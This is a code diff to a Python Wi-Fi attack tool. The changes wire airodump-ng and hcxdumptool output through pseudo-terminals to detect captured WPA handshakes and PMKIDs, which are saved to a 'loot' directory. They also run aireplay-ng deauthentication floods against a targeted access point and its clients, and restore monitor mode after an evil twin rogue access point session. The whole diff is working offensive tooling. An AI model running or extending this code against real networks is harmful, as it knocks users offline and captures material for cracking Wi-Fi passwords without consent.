@@ -4,6 +4,8 @@ from __future__ import annotations
 
 import csv
 import os
+import pty
+import select
 import re
 import signal
 import subprocess
@@ -70,6 +72,9 @@ class WifiMultiToolView:
         self._hcxdumptool: subprocess.Popen | None = None
         self._dnsmasq: subprocess.Popen | None = None
         self._hostapd: subprocess.Popen | None = None
+        
+        self.master_fd = None
+        self.slave_fd = None
         
         self.et_session: et.EvilTwinSession | None = None
         self._stop = False
@@ -160,16 +165,24 @@ class WifiMultiToolView:
         ts = datetime.now().strftime("%H%M%S")
         prefix = (Path("/opt/bigbox") / self.LOOT_DIR / f"handshake_{ap.essid or 'hidden'}_{ts}").absolute()
         self._capture_csv_path = Path(str(prefix) + "-01.csv")
+        
+        self.master_fd, self.slave_fd = pty.openpty()
         self._airodump = subprocess.Popen(
-            ["airodump-ng", "-c", ap.channel, "--bssid", ap.bssid, "--output-format", "csv,pcap", "-w", str(prefix), self.mon_iface],
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, preexec_fn=os.setsid
+            ["airodump-ng", "-c", str(ap.channel), "--bssid", ap.bssid, "--output-format", "csv,pcap", "-w", str(prefix), self.mon_iface],
+            stdin=self.slave_fd, stdout=self.slave_fd, stderr=self.slave_fd, preexec_fn=os.setsid
         )
         
         def watch_handshake():
-            for line in self._airodump.stdout:
-                if "WPA handshake" in line:
-                    self.handshake_captured = True
-                    self.status_msg = "HANDSHAKE CAPTURED!"
+            while self._airodump and self._airodump.poll() is None and not self._stop:
+                r, _, _ = select.select([self.master_fd], [], [], 0.1)
+                if self.master_fd in r:
+                    try:
+                        data = os.read(self.master_fd, 4096).decode('utf-8', 'replace')
+                        if "WPA handshake" in data:
+                            self.handshake_captured = True
+                            self.status_msg = "HANDSHAKE CAPTURED!"
+                    except OSError:
+                        break
         threading.Thread(target=watch_handshake, daemon=True).start()
         self._start_poll_thread()
 
@@ -177,18 +190,24 @@ class WifiMultiToolView:
         ap = self.targeted_ap
         out_file = self.LOOT_DIR / f"pmkid_{ap.essid or 'hidden'}.pcapng"
         self.status_msg = f"hcxdumptool running on ch {ap.channel}..."
-        # hcxdumptool -i <iface> -c <chan> --filter_list=<bssid_file> -o <out>
-        # For simplicity, we'll use a broad scan or a filter if we have it
+        
+        self.master_fd, self.slave_fd = pty.openpty()
         try:
             self._hcxdumptool = subprocess.Popen(
                 ["hcxdumptool", "-i", self.mon_iface, "-o", str(out_file), "--enable_status=1"],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
+                stdin=self.slave_fd, stdout=self.slave_fd, stderr=self.slave_fd, preexec_fn=os.setsid
             )
             def watch_pmkid():
-                for line in self._hcxdumptool.stdout:
-                    if "PMKID" in line:
-                        self.pmkid_captured = True
-                        self.status_msg = "PMKID CAPTURED!"
+                while self._hcxdumptool and self._hcxdumptool.poll() is None and not self._stop:
+                    r, _, _ = select.select([self.master_fd], [], [], 0.1)
+                    if self.master_fd in r:
+                        try:
+                            data = os.read(self.master_fd, 4096).decode('utf-8', 'replace')
+                            if "PMKID" in data or "EAPOL" in data:
+                                self.pmkid_captured = True
+                                self.status_msg = "PMKID/EAPOL CAPTURED!"
+                        except OSError:
+                            break
             threading.Thread(target=watch_pmkid, daemon=True).start()
         except FileNotFoundError:
             self.status_msg = "hcxdumptool not found"
@@ -226,12 +245,15 @@ class WifiMultiToolView:
             target_macs.extend([c.mac for c in self.clients])
 
         def _worker():
+            self.status_msg = "SENDING DEAUTHS..."
             for mac in target_macs:
-                cmd = ["aireplay-ng", "--deauth", "20", "-a", self.targeted_ap.bssid]
+                cmd = ["aireplay-ng", "--deauth", "5", "-a", self.targeted_ap.bssid]
                 if mac: cmd += ["-c", mac]
                 cmd.append(self.mon_iface)
                 subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            self.deauth_count += 1
+                self.deauth_count += 5
+            if not self.handshake_captured:
+                self.status_msg = "Waiting for handshake..."
 
         threading.Thread(target=_worker, daemon=True).start()
 
@@ -271,7 +293,9 @@ class WifiMultiToolView:
 
     def _stop_procs(self) -> None:
         self._stop = True
+        was_evil_twin = False
         if self.et_session:
+            was_evil_twin = True
             self.et_session.stop()
             self.et_session = None
             
@@ -280,6 +304,35 @@ class WifiMultiToolView:
                 try: os.killpg(os.getpgid(p.pid), signal.SIGINT)
                 except: p.terminate()
         self._airodump = self._hcxdumptool = self._dnsmasq = self._hostapd = None
+
+        if self.master_fd is not None:
+            try: os.close(self.master_fd)
+            except OSError: pass
+            self.master_fd = None
+        if self.slave_fd is not None:
+            try: os.close(self.slave_fd)
+            except OSError: pass
+            self.slave_fd = None
+
+        if was_evil_twin and self.original_iface:
+            self.status_msg = "Restoring monitor mode..."
+            # Evil twin stopped, put interface back to monitor mode for other attacks
+            subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["airmon-ng", "start", self.original_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(1)
+            # Find new monitor interface name if it changed
+            found_mon = None
+            for it in _list_wlan_ifaces():
+                if it.is_monitor:
+                    found_mon = it.name
+                    break
+            if not found_mon:
+                if os.path.exists(f"/sys/class/net/{self.original_iface}mon"):
+                    found_mon = f"{self.original_iface}mon"
+                else:
+                    found_mon = self.original_iface
+            self.mon_iface = found_mon
+            self.status_msg = f"Ready (Monitor: {self.mon_iface})"
 
     def _cleanup_and_exit(self) -> None:
         self.status_msg = "Cleaning up..."
